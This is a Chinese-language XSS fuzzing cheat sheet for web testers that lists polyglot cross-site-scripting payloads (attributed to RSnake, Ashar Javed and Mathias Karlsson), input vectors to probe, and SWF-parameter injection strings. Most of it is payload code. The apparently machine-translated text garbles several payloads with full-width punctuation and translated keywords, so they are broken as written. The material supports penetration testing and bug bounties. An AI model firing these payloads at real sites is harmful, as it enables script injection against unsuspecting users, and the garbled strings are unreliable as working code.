# 战术模糊 -  XSS

## XSS
核心理念：页面功能是否向用户显示了某些内容？
对于时间敏感的测试，适用80/20规则。许多测试人员使用Polyglot有效负载。你可能也有！

### *多上下文，基于过滤器旁路的多语言有效负载＃1（Rsnake XSS备忘单）

```
'; alert（String.fromCharCode（88,83,83））//'; alert（String。fromCharCode（88,83,83））//“; alert（String.fromCharCode（88,83,83））/ /";alert(String.fromCharCode(88,83,83))//--> </ SCRIPT>“>'> <SCRIPT> alert（String.fromCharCode（88,83,83））</ SCRIPT>
```



### 多上下文，基于过滤器旁路的多语言有效载荷＃2（Ashar Javed XSS Research）

```
 
“>> <marquee> <img src = x onerror = confirm（1）> </ marquee>”> </ plaintext \> </ | \> <plaintext / onmouseover = prompt（1）> <script> prompt（1 ）</ script> @ gmail.com <isindex formaction = javascript：alert（/ XSS /）type = submit>' - >“> </ script> <script> alert（1）</ script>”> <img / id =“confirm＆lpar; 1）”/ alt =“/”src =“/”onerror = eval（id＆％23x29;>'“> <img src =”http：//i.imgur.com/P8mL8.jpg “> 

￼￼```

### 多上下文多语言有效载荷（Mathias Karlsson）

```

“onclick = alert（1）// <button'onclick = alert（1）//> * / alert（1）//

```

###￼ 其他XSS观察

输入向量：
- 通过CSS自定义主题和配置文件
- 活动或会议名称
- 基于URI
- 从第三方导入（想想Facebook集成）
-  JSON POST值（检查返回的内容类型）
- 文件上传名称
- 上传的文件（swf，HTML，++）
- 自定义错误页面
- 假参数 - ？realparam = 1＆foo = bar'+ alert（/ XSS /）+'
- 登录和忘记密码表格

## SWF参数XSS

常见参数：
onload，allowedDomain，movieplayer，xmlPath，eventhandler，callback（更多关于OWASP页面）

普通注射带：￼

```

\％22}）））}赶上（E）{警报（document.domain的）;} //

```

```

“]）;}赶上（E）{}如果（self.a）self.a =警报（document.domain的）;！//

```


```

“A”）（（{类型： “就绪”}））;}赶上（E）{警报（1）} //

```
